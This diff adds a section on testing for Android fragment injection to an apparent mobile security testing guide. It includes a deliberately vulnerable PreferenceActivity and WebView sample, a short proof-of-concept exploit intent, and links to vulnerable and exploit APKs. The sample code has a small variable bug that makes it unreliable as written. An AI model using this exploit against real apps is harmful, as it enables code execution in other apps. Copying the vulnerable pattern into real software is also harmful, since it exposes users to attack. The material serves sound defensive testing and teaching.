@@ -698,6 +698,97 @@ The dynamic analysis of the app can determine what HTML or JavaScript files are 
 A full description of the attack can be found in the [blog article by MWR](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/ "WebView addJavascriptInterface Remote Code Execution").
 
 
+
+
+
+
+### Testing for Fragment Injection
+
+#### Overview
+
+Android SDK offers a way for developers to present a [`Preferences activity`](https://developer.android.com/reference/android/preference/PreferenceActivity.html). to users, allowing them to extend this abstract class and adapt it to their needs.
+
+This abstract class will parse the extra data fields received on a Intent, in particular the `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)`
+
+It is expected that the first field contains the `Fragment` class name and the second one contains the input bundle passed to the `Fragment`.
+
+Due to the fact that the `PreferenceActivity` uses reflection to load the fragment, this can lead to load an arbitrary class inside the package or the Android SDK. The loaded class runs in the context of the application that exports this activity.
+
+With this vulnerability the attacker will be able to call fragments inside the target application or run the code present in other classes constructors.
+Any class passed in the intent that does not extends the Fragment class will cause a java.lang.CastException, but before the exception is thrown the empty constructor is executed, allowing to run the code present in the class constructor.
+
+To mitigate this vulnerability, a new method called `isValidFragment` was added in Android 4.4 KitKat (API Level 19), that allows developers to override it and define which fragments are allowed to be used in this context.
+
+The default implementation returns true on version bellow Android 4.4 KitKat (API Level 19). For later versions with will throw an exception.
+
+
+#### Static Analysis
+
+Steps:
+- Find the package `minSDKVersion` to determine what will be the behaviour of the class.
+- Find exported Activities that extends the `PreferenceActivity` class.
+- Determine if the method isValidFragment is override
+
+The following example shows a Activity that extends this activity :
+
+```Java
+public class MyPreferences extends PreferenceActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+```
+
+The following examples shows the override of the isValidFragment method with an implementation that only allows the MyPreferenceFragment to be loaded:
+
+```Java
+@Override
+protected boolean isValidFragment(String fragmentName)
+{
+return "com.fullpackage.MyPreferenceFragment".equals(fragmentName);
+}
+
+```
+
+#### Example of Vulnerable App and Exploitation
+
+MainActivity.class
+```Java
+public class MainActivity extends PreferenceActivity {
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+    }
+}
+```
+
+MyFragment.class
+```Java
+public class MyFragment extends Fragment {
+    public void onCreate (Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+    }
+    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
+        View v = inflater.inflate(R.layout.fragmentLayout, null);
+        WebView myWebView = (WebView) wv.findViewById(R.id.webview);
+        myWebView.getSettings().setJavaScriptEnabled(true);
+        myWebView.loadUrl(this.getActivity().getIntent().getDataString());
+        return v;
+    }
+}
+```
+To exploit this vulnerable Activity you can create an application with the following code:
+
+```Java
+Intent i = new Intent();
+i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
+i.setClassName("pt.claudio.insecurefragment","pt.claudio.insecurefragment.MainActivity");
+i.putExtra(":android:show_fragment","pt.claudio.insecurefragment.MyFragment");
+Intent intent = i.setData(Uri.parse("https://security.claudio.pt"));
+startActivity(i);
+```
+
+[`Download Vulnerable App`](https://github.com/clviper/android-fragment-injection/blob/master/vulnerable.apk)
+[`Download Exploit POC App`](https://github.com/clviper/android-fragment-injection/blob/master/exploit.apk)
+
 ### Testing Object Persistence
 
 #### Overview
@@ -901,6 +992,11 @@ There are various steps one can take for dynamic analysis:
 2.	Regarding the reflection based approaches: use Xposed to hook into the de-serialization methods or add extra unprocessable information to the serialized objects to see how they are handled (e.g. Will the application crash? Or can you extract extra information by enriching the objects?).
 
 ### References
+
+#### Android Fragment Injection
+
+- https://www.synopsys.com/blogs/software-security/fragment-injection/
+- https://securityintelligence.com/wp-content/uploads/2013/12/android-collapses-into-fragments.pdf
 
 #### OWASP Mobile Top 10 2016
 
